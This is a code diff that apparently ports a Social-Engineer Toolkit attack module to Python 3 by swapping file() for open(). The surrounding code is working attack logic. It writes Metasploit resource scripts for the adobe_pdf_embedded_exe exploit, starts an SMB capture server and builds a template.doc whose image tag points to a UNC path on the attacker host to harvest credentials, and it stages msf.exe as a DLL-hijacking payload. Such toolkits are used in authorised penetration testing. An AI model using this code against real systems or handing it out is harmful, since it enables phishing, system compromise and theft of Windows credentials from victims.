@@ -27,7 +27,7 @@ print(meta_path)
 apache = 0
 
 # open set_config
-apache_check = file("/etc/setoolkit/set.config", "r").readlines()
+apache_check = open("/etc/setoolkit/set.config", "r").readlines()
 
 # loop this guy to search for the APACHE_SERVER config variable
 for line in apache_check:
@@ -184,7 +184,7 @@ if exploit_counter == 0:
         if os.path.isfile(msfpath + "local/template.pdf"):
             os.remove(msfpath + "local/template.pdf")
 
-        filewrite = file(setdir + "/template.rc", "w")
+        filewrite = open(setdir + "/template.rc", "w")
         filewrite.write("use exploit/windows/fileformat/adobe_pdf_embedded_exe\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" %
                         (rhost, lport, inputpdf, output))
         filewrite.close()
@@ -228,7 +228,7 @@ if exploit_counter == 0:
                          (setdir, setdir), shell=True)
 
     # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
-    filewrite = file(setdir + "/payload.options", "w")
+    filewrite = open(setdir + "/payload.options", "w")
     filewrite.write(payload + " " + rhost + " " + lport)
     filewrite.close()
     if exploit != "dll_hijacking":
@@ -251,11 +251,11 @@ if exploit == "unc_embed":
         letters = string.ascii_letters + string.digits
         return ''.join([random.choice(letters) for _ in range(length)])
     rand_gen = random_string()
-    filewrite = file(setdir + "/unc_config", "w")
+    filewrite = open(setdir + "/unc_config", "w")
     filewrite.write("use server/capture/smb\n")
     filewrite.write("exploit -j\r\n\r\n")
     filewrite.close()
-    filewrite = file(setdir + "/template.doc", "w")
+    filewrite = open(setdir + "/template.doc", "w")
     filewrite.write(
         r'''<html><head></head><body><img src="file://\\%s\%s.jpeg">''' % (rhost, rand_gen))
     filewrite.close()
@@ -285,18 +285,17 @@ if exploit == "dll_hijacking":
     # if we are not using apache
     if apache == 0:
         if not os.path.isfile("%s/fileformat.file" % (setdir)):
-            #        try:
-            filewrite = file(setdir + "/attack_vector", "w")
+            filewrite = open(setdir + "/attack_vector", "w")
             filewrite.write("hijacking")
             filewrite.close()
-            filewrite = file(setdir + "/site.template", "w")
+            filewrite = open(setdir + "/site.template", "w")
             filewrite.write("TEMPLATE=CUSTOM")
             filewrite.close()
             time.sleep(1)
             subprocess.Popen("mkdir %s/web_clone;cp src/html/msf.exe %s/web_clone/x" % (
                 setdir, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
             child = pexpect.spawn("python src/html/web_server.py")
-    #        except: child.close()
+
     # if we are using apache
     if apache == 1:
         subprocess.Popen("cp src/html/msf.exe %s/x.exe" %
